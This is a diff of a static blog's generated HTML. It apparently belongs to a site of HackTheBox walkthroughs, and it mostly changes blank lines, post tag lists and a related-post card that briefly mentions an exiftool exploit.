+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
   
     
     
@@ -3071,62 +3558,15 @@ bash-5.1# wc -c /root/root.txt
     
     
     
-      
-        
-        
-
   
     
     
     
     
-      
-    
   
     
     
     
-    
-      
-        
-        
-
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-        
-        
-
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
     
   
     
@@ -3155,194 +3595,9 @@ bash-5.1# wc -c /root/root.txt
     
     
       
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
         
         
 
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-        
-        
-
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-        
-        
-
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-    
   
     
     
@@ -3367,34 +3622,34 @@ bash-5.1# wc -c /root/root.txt
 
     
       
+      <a class="post-tag" href="/tags/hacking/">Hacking</a>
+    
+      
+      <a class="post-tag" href="/tags/hackthebox/">HackTheBox</a>
+    
+      
+      <a class="post-tag" href="/tags/machine/">Machine</a>
+    
+      
+      <a class="post-tag" href="/tags/walkthrough/">Walkthrough</a>
+    
+      
+      <a class="post-tag" href="/tags/medium/">Medium</a>
+    
+      
       <a class="post-tag" href="/tags/linux/">linux</a>
     
       
       <a class="post-tag" href="/tags/cve/">cve</a>
     
       
+      <a class="post-tag" href="/tags/easy/">Easy</a>
+    
+      
       <a class="post-tag" href="/tags/c/">c</a>
     
       
       <a class="post-tag" href="/tags/chroot/">chroot</a>
-    
-      
-      <a class="post-tag" href="/tags/coding/">coding</a>
-    
-      
-      <a class="post-tag" href="/tags/easy/">easy</a>
-    
-      
-      <a class="post-tag" href="/tags/exfitool/">exfitool</a>
-    
-      
-      <a class="post-tag" href="/tags/hashcat/">hashcat</a>
-    
-      
-      <a class="post-tag" href="/tags/imagemagick/">imagemagick</a>
-    
-      
-      <a class="post-tag" href="/tags/insane/">insane</a>
     
 
     </div>
@@ -3470,6 +3725,136 @@ bash-5.1# wc -c /root/root.txt
   
 
   
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
     
   
 
@@ -3506,16 +3891,6 @@ bash-5.1# wc -c /root/root.txt
 <!-- Fill with the other newlest posts  -->
 
 
-
-  
-    
-    
-      
-      
-        
-        
-        
-          
 
 
 
@@ -3602,7 +3977,7 @@ Paper is an easy rated machine on HackTheBox created by secnigma. For the user p
       
       
       <div class="card">
-        <a href="/posts/htb-Squashed/">
+        <a href="/posts/HackTheBox-Walkthrough-Investigation/">
           <div class="card-body">
             <!--
   Date format snippet
@@ -3614,13 +3989,13 @@ Paper is an easy rated machine on HackTheBox created by secnigma. For the user p
 
 
 <em class="small"
-    data-ts="1669305600"
+    data-ts="1682092800"
     data-df="ll"
     >
-  Nov 25, 2022
+  Apr 22, 2023
 </em>
 
-            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Squashead - Hack The Box</h3>
+            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Investigation</h3>
             <div class="text-muted small">
               <p>
                 
@@ -3629,8 +4004,11 @@ Paper is an easy rated machine on HackTheBox created by secnigma. For the user p
 
 
 
-                Squashed is an Easy Difficulty Linux machine that features a combination of both identifying and leveraging
-misconfigurations in NFS shares through impersonating users. Additionally, the box incorp...
+                In this machine, I had to exploit a known vulnerability in exiftool, find a password in some logs, and finally reverse a program to find how to exploit it.
+
+
+  Room: Investigation
+  Difficulty: Med...
               </p>
             </div>
           </div>
@@ -3738,6 +4116,493 @@ misconfigurations in NFS shares through impersonating users. Additionally, the b
     
     
     
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
   
     
     
@@ -3796,62 +4661,15 @@ misconfigurations in NFS shares through impersonating users. Additionally, the b
     
     
     
-      
-        
-        
-
   
     
     
     
     
-      
-    
   
     
     
     
-    
-      
-        
-        
-
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-        
-        
-
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
     
   
     
@@ -3880,194 +4698,9 @@ misconfigurations in NFS shares through impersonating users. Additionally, the b
     
     
       
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
         
         
 
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-        
-        
-
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-        
-        
-
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-    
   
     
     
@@ -4092,34 +4725,34 @@ misconfigurations in NFS shares through impersonating users. Additionally, the b
 
     
       
+      <a class="post-tag" href="/tags/hacking/">Hacking</a>
+    
+      
+      <a class="post-tag" href="/tags/hackthebox/">HackTheBox</a>
+    
+      
+      <a class="post-tag" href="/tags/machine/">Machine</a>
+    
+      
+      <a class="post-tag" href="/tags/walkthrough/">Walkthrough</a>
+    
+      
+      <a class="post-tag" href="/tags/medium/">Medium</a>
+    
+      
       <a class="post-tag" href="/tags/linux/">linux</a>
     
       
       <a class="post-tag" href="/tags/cve/">cve</a>
     
       
+      <a class="post-tag" href="/tags/easy/">Easy</a>
+    
+      
       <a class="post-tag" href="/tags/c/">c</a>
     
       
       <a class="post-tag" href="/tags/chroot/">chroot</a>
-    
-      
-      <a class="post-tag" href="/tags/coding/">coding</a>
-    
-      
-      <a class="post-tag" href="/tags/easy/">easy</a>
-    
-      
-      <a class="post-tag" href="/tags/exfitool/">exfitool</a>
-    
-      
-      <a class="post-tag" href="/tags/hashcat/">hashcat</a>
-    
-      
-      <a class="post-tag" href="/tags/imagemagick/">imagemagick</a>
-    
-      
-      <a class="post-tag" href="/tags/insane/">insane</a>
     
 
     </div>
